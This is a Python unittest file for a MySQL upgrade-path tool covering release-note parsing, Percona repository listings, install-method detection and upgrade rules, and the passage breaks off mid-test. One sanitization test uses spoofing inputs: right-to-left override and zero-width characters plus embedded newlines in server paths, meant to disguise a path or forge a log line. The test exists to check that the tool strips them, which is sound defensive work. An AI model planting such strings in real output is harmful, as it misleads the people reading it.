"""upgrade_targets.py: vendor release lists, install method and upgrade paths.

Fixtures in test/fixtures/upgrade_targets are vendor pages captured on
2026-11-08 (dev.mysql.com documentation index and release notes,
repo.percona.com listings), trimmed to the lines the parsers read. FakeReader
maps each allowed URL to its fixture and raises ValueError for any other, and
every test patches urllib's opener to fail, so no test reaches the network.
"Today" is fixed at 2026-11-08 through the module's datetime reference. HOME
and USERPROFILE are temporary directories and the secret backend is the vault.

Expected upgrade paths follow the MySQL 9.7 Reference Manual, "Upgrade Paths"
(Table 3.1), as the module docstring quotes it, plus its rule that an
Innovation series is superseded once the next LTS series has a release.
"""
import datetime
import http.client
import inspect
import io
import itertools
import json
import os
import re
import tempfile
import threading
import time
import types
import unicodedata
import unittest
import urllib.error
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from unittest import mock

from myflames import lifecycle as lc
from myflames import sysvar_history_mysql
from myflames import ui
from myflames import upgrade_targets as ut

FIXTURES = Path(__file__).parent / 'fixtures' / 'upgrade_targets'
TODAY = datetime.date(2026, 11, 8)
PERCONA_LINES = ('ps-80', 'ps-84-lts', 'ps-97-lts', 'ps-8x-innovation')
MYSQL_COMMENT = 'MySQL Community Server - GPL'
PERCONA_COMMENT = 'Percona Server (GPL), Release 34, Revision 0682ba15'
PXC_COMMENT = 'Percona XtraDB Cluster (GPL), Release rel34, Revision 0682ba1, WSREP version 26.1.4.3'


def fixture_text(name):
    return (FIXTURES / name).read_text(encoding='utf-8')


def fixture_map():
    """{allowed URL: fixture file name} for every captured vendor page."""
    urls = {ut.DOC_INDEX: 'doc-index.html', ut.PERCONA_ROOT: 'percona-root.html'}
    for series in ('8.0', '8.4', '9.7', '26.10'):
        urls[ut.RELNOTES % series] = 'relnotes-%s.html' % series
    for line in PERCONA_LINES:
        urls[ut.PERCONA_ROOT + line + '/apt/pool/main/p/percona-server/'] = 'percona-%s-apt.html' % line
        urls[ut.PERCONA_ROOT + line + '/yum/release/'] = 'percona-%s-yum-release.html' % line
        for el in (8, 9, 10):
            name = 'percona-%s-el%d-x86_64.html' % (line, el)
            if (FIXTURES / name).exists():
                urls['%s%s/yum/release/%d/RPMS/x86_64/' % (ut.PERCONA_ROOT, line, el)] = name
    return urls


NEWS_PAGE = re.compile(r'^https://dev\.mysql\.com/doc/relnotes/mysql/[0-9.]+/en/news-[0-9-]+\.html$')


class FakeReader(object):
    """The ``fetch`` argument: fixture text for a mapped URL, ValueError for any other.

    ``fail`` maps a URL to the exception it raises (a network failure)."""

    def __init__(self, fail=None, extra=None):
        self.urls = fixture_map()
        self.fail = dict(fail or {})
        self.extra = dict(extra or {})
        self.calls = []
        self._lock = threading.Lock()

    def __call__(self, url):
        with self._lock:
            self.calls.append(url)
        if url in self.fail:
            raise self.fail[url]
        if url in self.extra:
            return self.extra[url]
        name = self.urls.get(url)
        if name is None and NEWS_PAGE.match(url):
            # A release page with neither marker: available everywhere.
            return '<h2>Changes in MySQL 8.4.13 (2026-10-20)</h2><p>Functionality Added or Changed</p>'
        if name is None:
            raise ValueError('No fixture for %s' % url)
        return fixture_text(name)


class LayoutConnection(object):
    """A connection that answers SHOW GLOBAL VARIABLES with *variables* (tab-separated, as the client prints)."""

    def __init__(self, variables):
        self.variables = dict(variables)
        self.calls = []

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False

    def run(self, sql, extra_flags=None, timeout=None):
        self.calls.append((sql, list(extra_flags or [])))
        if 'SHOW GLOBAL VARIABLES' not in sql:
            raise AssertionError('unexpected SQL: ' + sql)
        return ''.join('%s\t%s\n' % (name, value) for name, value in sorted(self.variables.items()))


class _Today(datetime.date):
    @classmethod
    def today(cls):
        return cls(TODAY.year, TODAY.month, TODAY.day)


def fixed_datetime(today_class=_Today):
    """A stand-in for the module's ``datetime`` reference whose date.today() is fixed."""
    return types.SimpleNamespace(date=today_class, datetime=datetime.datetime, timezone=datetime.timezone)


class FakeClock(object):
    def __init__(self, start=1000.0):
        self.now = start

    def monotonic(self):
        return self.now


class BlockingReader(FakeReader):
    """A reader whose listed URLs hang until release() (or 30 s), as a stalled vendor site would."""

    def __init__(self, block, **kwargs):
        super(BlockingReader, self).__init__(**kwargs)
        self.block = set(block)
        self.gate = threading.Event()

    def release(self):
        self.gate.set()

    def __call__(self, url):
        if url in self.block:
            with self._lock:
                self.calls.append(url)
            self.gate.wait(30)
            raise OSError('stalled read released')
        return super(BlockingReader, self).__call__(url)


def mysql_layout(version, **extra):
    layout = {'version': version, 'version_comment': MYSQL_COMMENT, 'basedir': '/usr/',
              'plugin_dir': '/usr/lib64/mysql/plugin/', 'version_compile_os': 'Linux',
              'version_compile_machine': 'x86_64', 'hostname': 'db1'}
    layout.update(extra)
    return layout


def percona_layout(version='8.0.43-34', rpm=False, **extra):
    layout = {'version': version, 'version_comment': PERCONA_COMMENT, 'basedir': '/usr/',
              'plugin_dir': '/usr/lib64/mysql/plugin/' if rpm else '/usr/lib/mysql/plugin/',
              'version_compile_os': 'Linux', 'version_compile_machine': 'x86_64', 'hostname': 'db1'}
    layout.update(extra)
    return layout


def shell_tools(version):
    return {'tools': {'mysqlsh': {'available': True, 'version_tuple': list(version)}}}


def catalog_versions():
    return [row[0] for row in sysvar_history_mysql.VERSIONS]


def newest(versions, prefix):
    return max((v for v in versions if v.startswith(prefix)), key=lambda v: tuple(int(p) for p in v.split('.')))


def rel(version):
    return {'version': version, 'date': None, 'url': None}


class Base(unittest.TestCase):
    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.tmp = tmp.name
        env = mock.patch.dict(os.environ, {'HOME': tmp.name, 'USERPROFILE': tmp.name,
                                           'MYFLAMES_SECRET_BACKEND': 'vault'})
        env.start()
        self.addCleanup(env.stop)
        os.environ.pop('MYFLAMES_VAULT_PASSPHRASE', None)
        ut._CACHE.clear()
        ut._INFLIGHT.clear()
        self.addCleanup(ut._CACHE.clear)
        # No test reaches the network: the module's only way out is build_opener.
        self.network = {}
        for name in ('build_opener', 'urlopen'):
            guard = mock.patch.object(urllib.request, name, side_effect=AssertionError('a test reached the network'))
            self.network[name] = guard.start()
            self.addCleanup(guard.stop)
        clock = mock.patch.object(ut, 'datetime', fixed_datetime())
        clock.start()
        self.addCleanup(clock.stop)

    def report(self, layout, fetch, tools=None):
        """upgrade_targets() with *layout* as the server's variables; checks the report is plain JSON."""
        with mock.patch.object(ut, 'read_layout', return_value=dict(layout)) as read:
            report = ut.upgrade_targets(object(), tools=tools, fetch=fetch)
        read.assert_called_once()
        json.dumps(report, allow_nan=False)
        self.assertEqual(report['schema_version'], 'upgrade-targets-1.0')
        return report

    def assertAllowed(self, urls):
        for url in urls:
            self.assertTrue(any(re.fullmatch(p, url) for p in ut._ALLOWED),
                            'the module asked its reader for a URL _fetch would refuse: %s' % url)


# Parsers -------------------------------------------------------------------

class ParseDocIndex(Base):
    def test_series_newest_first_numerically(self):
        # A string sort would put 9.7 before 26.10.
        self.assertEqual(ut.parse_doc_index(fixture_text('doc-index.html')), ['26.10', '9.7', '8.4', '8.0'])

    def test_capped_at_max_series_pages_and_deduplicated(self):
        text = ''.join('<a href="/doc/relnotes/mysql/9.%d/en/">x</a><a href="/doc/relnotes/mysql/9.%d/en/">y</a>'
                       % (n, n) for n in range(10))
        found = ut.parse_doc_index(text)
        self.assertEqual(len(found), ut.MAX_SERIES_PAGES)
        self.assertEqual(found[0], '9.9', 'the newest series must survive the cap')
        self.assertEqual(len(set(found)), len(found))

    def test_no_release_notes_links_gives_nothing(self):
        self.assertEqual(ut.parse_doc_index('<a href="/doc/refman/8.4/en/">Reference Manual</a>'), [])


class ParseReleaseNotes(Base):
    def versions(self, series, text=None, today=TODAY):
        text = fixture_text('relnotes-%s.html' % series) if text is None else text
        return ut.parse_release_notes(text, series, ut.RELNOTES % series, today=today)

    def test_80_page_drops_pre_ga_entries(self):
        found = {r['version'] for r in self.versions('8.0')}
        # 8.0.0-8.0.2 are Development Milestones, 8.0.3-8.0.4 Release Candidates,
        # 8.0.5-8.0.10 were skipped; 8.0.11 is the first GA release.
        self.assertEqual(found, {'8.0.%d' % n for n in range(11, 47)})

    def test_pre_ga_labels_dropped_and_ga_label_kept(self):
        def entry(version, inside):
            return '<a href="news-%s.html">Changes in MySQL %s (%s)</a>\n' % (version.replace('.', '-'), version, inside)
        text = (entry('8.4.20', '2026-01-01, Release Candidate') + entry('8.4.21', '2026-01-02, Development Milestone')
                + entry('8.4.22', '2026-01-03, Milestone 5') + entry('8.4.23', '2026-01-04, Beta')
                + entry('8.4.24', '2026-01-05, Not yet released') + entry('8.4.25', '2026-01-06, General Availability')
                + entry('8.4.26', 'not a date'))
        self.assertEqual([r['version'] for r in self.versions('8.4', text)], ['8.4.25'])

    def test_future_dates_dropped_against_today(self):
        def has_974(today):
            return '9.7.4' in {r['version'] for r in self.versions('9.7', today=today)}
        self.assertFalse(has_974(datetime.date(2026, 10, 19)), '9.7.4 is dated 2026-10-20')
        self.assertTrue(has_974(datetime.date(2026, 10, 20)), 'a release dated today is released')

    def test_97_page_keeps_90_to_97_and_rejects_other_series(self):
        text = fixture_text('relnotes-9.7.html') + (
            '<a href="news-26-7-0.html">Changes in MySQL 26.7.0 (2026-07-28)</a>\n'
            '<a href="news-9-8-0.html">Changes in MySQL 9.8.0 (2026-07-28)</a>\n'
            '<a href="news-8-4-13.html">Changes in MySQL 8.4.13 (2026-10-20)</a>\n')
        found = {r['version'] for r in self.versions('9.7', text)}
        expected = {'9.0.0', '9.0.1', '9.1.0', '9.2.0', '9.3.0', '9.4.0', '9.5.0', '9.6.0',
                    '9.7.0', '9.7.1', '9.7.2', '9.7.3', '9.7.4'}
        self.assertEqual(found, expected, '26.x (another major), 9.8 (newer series) and 8.4 must be ignored')

    def test_84_page_lists_the_81_to_83_innovations(self):
        found = {r['version'] for r in self.versions('8.4')}
        self.assertEqual(found, {'8.1.0', '8.2.0', '8.3.0'} | {'8.4.%d' % n for n in range(0, 14)})

    def test_26_10_page(self):
        self.assertEqual({r['version'] for r in self.versions('26.10')}, {'26.7.0', '26.7.1', '26.10.0'})

    def test_link_and_date_built_from_the_entry(self):
        entry = [r for r in self.versions('8.4') if r['version'] == '8.4.13'][0]
        self.assertEqual(entry, {'version': '8.4.13', 'date': '2026-10-20',
                                 'url': 'https://dev.mysql.com/doc/relnotes/mysql/8.4/en/news-8-4-13.html'})


class ParsePercona(Base):
    def test_lines_from_the_repository_root(self):
        self.assertEqual(ut.parse_percona_lines(fixture_text('percona-root.html')),
                         {'ps-56': '5.6', 'ps-57': '5.7', 'ps-80': '8.0', 'ps-84-lts': '8.4',
                          'ps-8x-innovation': '8.x', 'ps-97-lts': '9.7'})

    def test_lines_ignore_other_repositories(self):
        text = ('<a href="pdps-80/">pdps-80/</a><a href="pxc-80/">pxc-80/</a><a href="ps-80-arm/">x</a>'
                '<a href="percona/">percona/</a><a href="ps-84-lts/">ps-84-lts/</a>')
        self.assertEqual(ut.parse_percona_lines(text), {'ps-84-lts': '8.4'})

    def test_deb_listing(self):
        found = ut.parse_percona_deb(fixture_text('percona-ps-84-lts-apt.html'))
        self.assertEqual(sorted(found), [('8.4.%d' % n, n) for n in (10, 11, 2, 3, 4, 5, 6, 7, 8)])
        self.assertEqual(found[('8.4.11', 11)], {'bookworm', 'bullseye', 'jammy', 'noble', 'resolute', 'trixie'})
        self.assertEqual(found[('8.4.2', 2)], {'focal'})

    def test_deb_ignores_other_packages_and_architectures(self):
        text = ('percona-server-client_8.4.11-11-1.noble_amd64.deb percona-server-server-dbg_8.4.11-11-1.noble_amd64.deb '
                'percona-server-server_8.4.11-11-1.noble_i386.deb percona-server-server_8.4.12-12-1.noble_arm64.deb')
        self.assertEqual(ut.parse_percona_deb(text), {('8.4.12', 12): {'noble'}})

    def test_rpm_listing(self):
        found = ut.parse_percona_rpm(fixture_text('percona-ps-80-el8-x86_64.html'))
        self.assertEqual(len(found), 33)
        self.assertEqual(found[('8.0.21', 12)], {'el8'}, 'release 12.2 is build 12')
        self.assertIn(('8.0.26', 16), found)
        self.assertIn(('8.0.26', 17), found, 'two builds of one upstream version stay apart')
        el10 = ut.parse_percona_rpm(fixture_text('percona-ps-84-lts-el10-x86_64.html'))
        self.assertEqual(el10, {('8.4.%d' % n, n): {'el10'} for n in (6, 7, 8, 10, 11)})

    def test_rpm_ignores_debuginfo_and_other_arches(self):
        text = ('percona-server-server-debuginfo-8.4.11-11.1.el9.x86_64.rpm percona-server-client-8.4.11-11.1.el9.x86_64.rpm '
                'percona-server-server-8.4.11-11.1.el9.i686.rpm percona-server-server-8.4.11-11.1.el9.aarch64.rpm')
        self.assertEqual(ut.parse_percona_rpm(text), {('8.4.11', 11): {'el9'}})


# Install method ------------------------------------------------------------

class InstallMethod(Base):
    def method(self, **variables):
        return ut.install_method(variables)

    def test_rpm_layout(self):
        found = self.method(version='8.0.43', basedir='/usr/', plugin_dir='/usr/lib64/mysql/plugin/',
                            version_compile_os='Linux', version_compile_machine='x86_64')
        self.assertEqual((found['method'], found['confidence'], found['package']), ('rpm', 'high', None))
        self.assertIn('basedir is /usr/', found['evidence'])
        self.assertIn('plugin_dir is /usr/lib64/mysql/plugin/', found['evidence'])

    def test_deb_layout_confidence_follows_word_size(self):
        for machine, confidence in (('x86_64', 'high'), ('aarch64', 'high'), ('i686', 'medium')):
            with self.subTest(machine=machine):
                found = self.method(version='8.0.43', basedir='/usr/', plugin_dir='/usr/lib/mysql/plugin/',
                                    version_compile_os='Linux', version_compile_machine=machine)
                self.assertEqual((found['method'], found['confidence']), ('deb', confidence))

    def test_ubuntu_package(self):
        found = self.method(version='8.0.43-0ubuntu0.24.04.1', version_comment='(Ubuntu)', basedir='/usr/',
                            plugin_dir='/usr/lib/mysql/plugin/', version_compile_os='Linux',
                            version_compile_machine='x86_64')
        self.assertEqual((found['method'], found['confidence']), ('ubuntu_deb', 'high'),
                         'the Ubuntu suffix wins over the DEB layout it shares')
        self.assertTrue(any('8.0.43-0ubuntu0.24.04.1' in e for e in found['evidence']), found['evidence'])
        by_comment = self.method(version='8.0.43', version_comment='(Ubuntu)', basedir='/usr/',
                                 plugin_dir='/usr/lib/mysql/plugin/', version_compile_os='Linux')
        self.assertEqual(by_comment['method'], 'ubuntu_deb')

    def test_generic_tarball_names_the_archive(self):
        base = '/usr/local/mysql-8.0.43-linux-glibc2.28-x86_64/'
        found = self.method(version='8.0.43', basedir=base, plugin_dir=base + 'lib/plugin/',
                            version_compile_os='Linux', version_compile_machine='x86_64')
        self.assertEqual((found['method'], found['confidence'], found['package']),
                         ('tarball', 'high', 'mysql-8.0.43-linux-glibc2.28-x86_64'))
        self.assertTrue(any('mysql-8.0.43-linux-glibc2.28-x86_64' in e for e in found['evidence']))

    def test_tarball_layout_without_archive_name_is_medium(self):
        found = self.method(version='8.0.43', basedir='/opt/mysql', plugin_dir='/opt/mysql/lib/plugin',
                            version_compile_os='Linux')
        self.assertEqual((found['method'], found['confidence'], found['package']), ('tarball', 'medium', None))

    def test_archive_name_alone_is_a_medium_tarball(self):
        found = self.method(version='8.0.43', basedir='/usr/local/mysql-8.0.43-linux-glibc2.28-x86_64',
                            plugin_dir='/var/lib/mysql-plugins', version_compile_os='Linux')
        self.assertEqual((found['method'], found['confidence'], found['package']),
                         ('tarball', 'medium', 'mysql-8.0.43-linux-glibc2.28-x86_64'))

    def test_percona_tarball(self):
        base = '/opt/Percona-Server-8.0.43-34-Linux.x86_64.glibc2.35/'
        found = self.method(version='8.0.43-34', version_comment=PERCONA_COMMENT, basedir=base,
                            plugin_dir=base + 'lib/plugin/', version_compile_os='Linux',
                            version_compile_machine='x86_64')
        self.assertEqual((found['method'], found['package']),
                         ('tarball', 'Percona-Server-8.0.43-34-Linux.x86_64.glibc2.35'))

    def test_windows_installer_and_other_folders(self):
        msi = self.method(version='8.0.43', basedir='C:\\Program Files\\MySQL\\MySQL Server 8.0\\',
                          plugin_dir='C:\\Program Files\\MySQL\\MySQL Server 8.0\\lib\\plugin\\',
                          version_compile_os='Win64', version_compile_machine='x86_64')
        self.assertEqual((msi['method'], msi['confidence']), ('windows_msi', 'medium'))
        other = self.method(version='8.0.43', basedir='D:\\mysql\\', plugin_dir='D:\\mysql\\lib\\plugin\\',
                            version_compile_os='Win64')
        self.assertEqual((other['method'], other['confidence']), ('windows_zip', 'low'))

    def test_homebrew_and_macos(self):
        for base in ('/opt/homebrew/Cellar/mysql/9.6.0/', '/usr/local/Cellar/mysql/9.6.0/'):
            with self.subTest(basedir=base):
                found = self.method(version='9.6.0', basedir=base, plugin_dir=base + 'lib/plugin/',
                                    version_compile_os='macos15', version_compile_machine='arm64')
                self.assertEqual((found['method'], found['confidence']), ('homebrew', 'high'))
        package = self.method(version='9.6.0', basedir='/usr/local/mysql-9.6.0-macos15-arm64/',
                              version_compile_os='macos15')
        self.assertEqual((package['method'], package['confidence']), ('macos', 'low'))

    def test_unknown_layout(self):
        found = self.method(version='8.0.43', basedir='/srv/mysql/', plugin_dir='/srv/plugins/',
                            version_compile_os='Linux', version_compile_machine='x86_64')
        self.assertEqual((found['method'], found['label'], found['confidence']), ('unknown', 'Not recognized', 'low'))
        self.assertEqual(ut.install_method(None)['method'], 'unknown')

    def test_container_flag_needs_a_12_hex_host_name_on_the_rpm_layout(self):
        # The official MySQL and Percona images use the RPM layout
        # (packaging/rpm-docker); a container-like host name on another layout
        # says nothing about how to upgrade.
        rpm = {'basedir': '/usr/', 'plugin_dir': '/usr/lib64/mysql/plugin/'}
        for hostname, expected in (('3f2a9c1b7d4e', True), ('3f2a9c1b7d4', False), ('3f2a9c1b7d4e0', False),
                                   ('db1', False), ('', False)):
            with self.subTest(hostname=hostname):
                self.assertIs(self.method(version='8.0.43', hostname=hostname, **rpm)['container'], expected)
        deb = self.method(version='8.0.43', hostname='3f2a9c1b7d4e', basedir='/usr/', plugin_dir='/usr/lib/mysql/plugin/')
        self.assertIs(deb['container'], False)
        self.assertIs(self.method(version='8.0.43', hostname='3f2a9c1b7d4e')['container'], False)

    def test_build_id_in_evidence(self):
        build_id = '0123456789abcdef0123456789abcdef01234567'
        found = self.method(version='8.0.43', basedir='/usr/', plugin_dir='/usr/lib64/mysql/plugin/',
                            build_id=build_id)
        self.assertEqual(found['build_id'], build_id)
        self.assertTrue(any('build_id 0123456789abcdef' in e for e in found['evidence']), found['evidence'])
        self.assertIsNone(self.method(version='8.0.43')['build_id'])

    def test_variable_names_are_case_insensitive_and_none_is_empty(self):
        found = ut.install_method({'BASEDIR': '/usr', 'Plugin_Dir': '/usr/lib64/mysql/plugin', 'hostname': None})
        self.assertEqual(found['method'], 'rpm')
        self.assertFalse(found['container'])

    def assertPlain(self, found):
        texts = list(found['evidence']) + [found['package'] or '', found['build_id'] or '']
        for text in texts:
            bad = [c for c in text if unicodedata.category(c) in ('Cc', 'Cf')]
            self.assertEqual(bad, [], 'control or format characters reached display text: %r' % text)

    def test_control_and_format_characters_never_reach_the_evidence(self):
        # U+202E (RIGHT-TO-LEFT OVERRIDE) could make a path read as another; a
        # newline could forge a second evidence line.
        found = self.method(version='8.0.43', basedir='/opt/mysql‮/evil\n',
                            plugin_dir='/opt/mysql‮/evil/lib/plugin\r\n',
                            build_id='abc​def\x00', version_compile_os='Linux')
        self.assertPlain(found)
        self.assertIn('basedir is /opt/mysql/evil', found['evidence'])
        self.assertEqual(found['method'], 'tarball', 'the layout is read after the characters are removed')
        self.assertEqual(found['build_id'], 'abcdef')
        ubuntu = self.method(version='8.0.43-0ubuntu0.24.04.1‮\n', basedir='/usr/⁦',
                             version_compile_os='Linux')
        self.assertEqual(ubuntu['method'], 'ubuntu_deb')
        self.assertPlain(ubuntu)
        tarball = self.method(version='8.0.43', basedir='/opt/mysql-8.0.43-linux-glibc2.28-x86_64‮',
                              version_compile_os='Linux')
        self.assertPlain(tarball)

    def test_long_server_text_is_bounded(self):
        found = self.method(version='8.0.43', basedir='/' + 'a' * 5000, plugin_dir='/' + 'b' * 5000)
        self.assertTrue(all(len(e) <= 400 for e in found['evidence']), [len(e) for e in found['evidence']])


# Upgrade paths through upgrade_targets() and the release notes fixtures ------

class MySQLPaths(Base):
    def setUp(self):
        super(MySQLPaths, self).setUp()
        self.reader = FakeReader()

    def mysql(self, version, tools=None, **layout):
        report = self.report(mysql_layout(version, **layout), self.reader, tools=tools)
        self.assertEqual(report['source']['kind'], 'release_notes')
        self.assertAllowed(self.reader.calls)
        return report

    @staticmethod
    def paths(report):
        return [(t['version'], t['path']) for t in report['targets']]

    @staticmethod
    def blocked(report):
        return {n['series']: n for n in report['not_direct']}

    def test_80_43_gets_same_series_and_next_lts(self):
        report = self.mysql('8.0.43')
        self.assertEqual(self.paths(report), [('8.0.%d' % n, 'patch') for n in (44, 45, 46)] +
                         [('8.4.%d' % n, 'next_lts') for n in range(0, 14)])
        self.assertEqual(report['recommended'], '8.4.13')
        self.assertEqual([n['series'] for n in report['not_direct']],
                         ['8.1', '8.2', '8.3', '9.0', '9.1', '9.2', '9.3', '9.4', '9.5', '9.6', '9.7', '26.7', '26.10'],
                         'not_direct is in numeric series order')
        blocked = self.blocked(report)
        for series in ('8.1', '8.2', '8.3'):
            self.assertIn('the 8.4 LTS series, a direct target', blocked[series]['reason'])
        for series in ('9.0', '9.6', '9.7', '26.7', '26.10'):
            self.assertIn('go to 8.4 first', blocked[series]['reason'])
        self.assertEqual(blocked['9.0']['newest'], '9.0.1')
        self.assertEqual(report['unclassified'], [])

    def test_84_5_gets_patches_and_97_while_9x_innovations_are_superseded(self):
        report = self.mysql('8.4.5')
        self.assertEqual(self.paths(report), [('8.4.%d' % n, 'patch') for n in range(6, 14)] +
                         [('9.7.%d' % n, 'next_lts') for n in range(0, 5)])
        self.assertEqual(report['recommended'], '9.7.4')
        blocked = self.blocked(report)
        self.assertEqual(sorted(blocked, key=lambda s: tuple(map(int, s.split('.')))),
                         ['9.0', '9.1', '9.2', '9.3', '9.4', '9.5', '9.6', '26.7', '26.10'])
        for series in ('9.0', '9.6'):
            self.assertIn('the 9.7 LTS series, a direct target', blocked[series]['reason'])
        for series in ('26.7', '26.10'):
            self.assertIn('go to 9.7 first', blocked[series]['reason'])
        self.assertNotIn('8.3', blocked, 'older series are never listed')

    def test_95_0_innovation_gets_97_only(self):
        report = self.mysql('9.5.0')
        self.assertEqual(self.paths(report), [('9.7.%d' % n, 'lts_after_innovation') for n in range(0, 5)])
        self.assertEqual(report['recommended'], '9.7.4')
        blocked = self.blocked(report)
        self.assertEqual(list(blocked), ['9.6', '26.7', '26.10'])
        self.assertIn('the 9.7 LTS series, a direct target', blocked['9.6']['reason'])
        self.assertIn('go to 9.7 first', blocked['26.10']['reason'])

    def test_97_2_gets_patches_and_innovations_without_a_next_lts(self):
        report = self.mysql('9.7.2')
        self.assertEqual(self.paths(report), [('9.7.3', 'patch'), ('9.7.4', 'patch'), ('26.7.0', 'innovation'),
                                              ('26.7.1', 'innovation'), ('26.10.0', 'innovation')])
        self.assertEqual(report['recommended'], '9.7.4', 'the newest patch of the LTS, not an Innovation release')
        self.assertEqual(report['not_direct'], [])

    def test_57_44_gets_80_only(self):
        report = self.mysql('5.7.44')
        self.assertEqual(self.paths(report), [('8.0.%d' % n, 'next_lts') for n in range(11, 47)])
        self.assertEqual(report['recommended'], '8.0.46')
        blocked = self.blocked(report)
        self.assertIn('go to 8.0 first', blocked['8.4']['reason'])
        self.assertIn('go to 8.0 first', blocked['8.1']['reason'])

    def test_targets_carry_release_notes_links_and_no_sort_key(self):
        report = self.mysql('8.0.43')
        target = [t for t in report['targets'] if t['version'] == '8.4.13'][0]
        self.assertEqual(target['url'], 'https://dev.mysql.com/doc/relnotes/mysql/8.4/en/news-8-4-13.html')
        self.assertEqual((target['date'], target['series'], target['check_version'], target['path_label']),
                         ('2026-10-20', '8.4', '8.4.13', 'next LTS'))
        self.assertNotIn('key', target)
        self.assertIsNone(target['shell'], 'no MySQL Shell detected: no compatibility flag')
        self.assertEqual(report['source']['urls'], [ut.DOC_INDEX] + [ut.RELNOTES % s for s in ('26.10', '9.7', '8.4', '8.0')])
        self.assertIsNone(report['source']['error'])
        self.assertEqual(self.reader.calls[0], ut.DOC_INDEX)

    def test_releases_dated_after_today_are_not_offered(self):
        class Before(datetime.date):
            @classmethod
            def today(cls):
                return cls(2026, 10, 19)
        with mock.patch.object(ut, 'datetime', fixed_datetime(Before)):
            report = self.mysql('8.0.43')
        self.assertEqual(report['recommended'], '8.4.12', '8.4.13 is dated 2026-10-20')
        self.assertNotIn('26.10', self.blocked(report))

    def test_failed_release_notes_page_is_partial(self):
        self.reader.fail[ut.RELNOTES % '26.10'] = OSError('connection reset')
        report = self.mysql('9.7.2')
        self.assertEqual(self.paths(report), [('9.7.3', 'patch'), ('9.7.4', 'patch')])
        self.assertEqual(report['source']['error'], 'Could not reach the release source.')
        self.assertNotIn(ut.RELNOTES % '26.10', report['source']['urls'])

    def test_shell_flags_against_mysql_shell_96(self):
        # mysql-shell modules/util/upgrade_checker/common.cc Upgrade_info::validate:
        # the server must be older than the shell, and the target's series no
        # newer than the shell's series.
        report = self.mysql('8.4.5', tools=shell_tools((9, 6, 0)))
        flags = {t['version']: t['shell'] for t in report['targets']}
        self.assertEqual(flags['8.4.13'], {'ok': True, 'needs': None})
        self.assertEqual(flags['9.7.0'], {'ok': False, 'needs': '9.7'})
        self.assertEqual(report['notes'], [])
        newer = self.mysql('9.7.2', tools=shell_tools((9, 6, 0)))
        self.assertTrue(all(t['shell']['ok'] is False for t in newer['targets']))
        self.assertEqual(len(newer['notes']), 1)
        self.assertIn('MySQL Shell 9.6.0 is not newer than this server', newer['notes'][0])
        unavailable = {'tools': {'mysqlsh': {'available': False, 'version_tuple': [9, 6, 0]}}}
        self.assertIsNone(self.mysql('8.4.5', tools=unavailable)['targets'][0]['shell'])


class PathRules(Base):
    """upgrade_paths through build_report with hand-made release lists (the cases the fixtures cannot show)."""
    KINDS = {'5.7': 'bugfix', '8.0': 'bugfix', '8.4': 'lts', '9.5': 'innovation', '9.6': 'innovation',
             '9.7': 'lts', '26.7': 'innovation'}

    def build(self, version, releases, kinds=None, **extra):
        report = ut.build_report(mysql_layout(version), mysql={'releases': [rel(v) for v in releases]},
                                 kinds=self.KINDS if kinds is None else kinds, **extra)
        json.dumps(report, allow_nan=False)
        return report

    def test_innovations_are_direct_until_the_next_lts_has_a_release(self):
        before = self.build('8.4.5', ['8.4.6', '9.5.0', '9.6.0'])
        self.assertEqual([(t['version'], t['path']) for t in before['targets']],
                         [('8.4.6', 'patch'), ('9.5.0', 'innovation'), ('9.6.0', 'innovation')])
        self.assertEqual(before['recommended'], '8.4.6', 'an LTS user is pointed at the LTS patch')
        after = self.build('8.4.5', ['8.4.6', '9.5.0', '9.6.0', '9.7.0'])
        self.assertEqual([t['version'] for t in after['targets']], ['8.4.6', '9.7.0'])
        self.assertEqual([n['series'] for n in after['not_direct']], ['9.5', '9.6'])

    def test_innovation_to_newer_innovation_before_the_next_lts(self):
        report = self.build('9.5.0', ['9.5.0', '9.6.0'])
        self.assertEqual([(t['version'], t['path']) for t in report['targets']], [('9.6.0', 'innovation')])

    def test_series_missing_from_the_kinds_map_is_unclassified(self):
        kinds = {k: v for k, v in ut.series_kinds().items() if k != '26.10'}
        report = self.build('9.7.2', ['9.7.3', '26.7.0', '26.10.0'], kinds=kinds)
        self.assertEqual([t['version'] for t in report['targets']], ['9.7.3', '26.7.0'])
        self.assertEqual([(u['series'], u['newest']) for u in report['unclassified']], [('26.10', '26.10.0')])
        self.assertIn('does not know whether 26.10 is an LTS or Innovation series', report['unclassified'][0]['reason'])
        self.assertEqual(report['not_direct'], [])

    def test_unknown_current_series_reason_matches_what_is_offered(self):
        # BUG (upgrade_targets.upgrade_paths): when the server's own series is
        # missing from the kinds map, every blocked series gets the reason
        # "myflames does not know the release kind of X, so only its own series
        # is placed on a path", yet the own series' newer releases land in
        # `unclassified` and `targets` stays empty, so the sentence is false.
        # Either place the own series on a 'patch' path (the manual allows
        # upgrades within any series) or change the reason text.
        report = self.build('9.6.0', ['9.6.1', '9.7.0'], kinds={'8.4': 'lts', '9.7': 'lts'})
        claimed = any('only its own series is placed on a path' in n['reason'] for n in report['not_direct'])
        offered = '9.6.1' in [t['version'] for t in report['targets']]
        self.assertFalse(claimed and not offered,
                         'a not_direct reason says the own series (9.6) is placed on a path, but 9.6.1 is in '
                         'unclassified %r and targets is %r' % (report['unclassified'], report['targets']))

    def test_build_report_uses_the_bundled_kinds_by_default(self):
        kinds = ut.series_kinds()
        self.assertEqual((kinds['5.7'], kinds['8.0'], kinds['8.1'], kinds['8.4'], kinds['9.6'], kinds['9.7']),
                         ('bugfix', 'bugfix', 'innovation', 'lts', 'innovation', 'lts'))
        report = ut.build_report(mysql_layout('8.4.5'), mysql={'releases': [rel('9.6.0'), rel('9.7.0')]})
        self.assertEqual([t['version'] for t in report['targets']], ['9.7.0'])


class Guidance(Base):
    def test_guidance_follows_the_install_method(self):
        # Each method names the repository or download its releases come from;
        # an RPM install sent to the APT guide (or the reverse) is the defect.
        cases = (
            (mysql_layout('8.0.43'), ut.YUM_GUIDE, ('Yum repository',)),
            (mysql_layout('8.0.43', plugin_dir='/usr/lib/mysql/plugin/'), ut.APT_GUIDE, ('APT repository',)),
            (mysql_layout('8.0.43-0ubuntu0.24.04.1'), ut.APT_GUIDE, ('Ubuntu', 'APT repository')),
            (mysql_layout('8.0.43', basedir='/usr/local/mysql-8.0.43-linux-glibc2.28-x86_64',
                          plugin_dir='/usr/local/mysql-8.0.43-linux-glibc2.28-x86_64/lib/plugin'),
             ut.MYSQL_DOWNLOADS, ('mysql-8.0.43-linux-glibc2.28-x86_64',)),
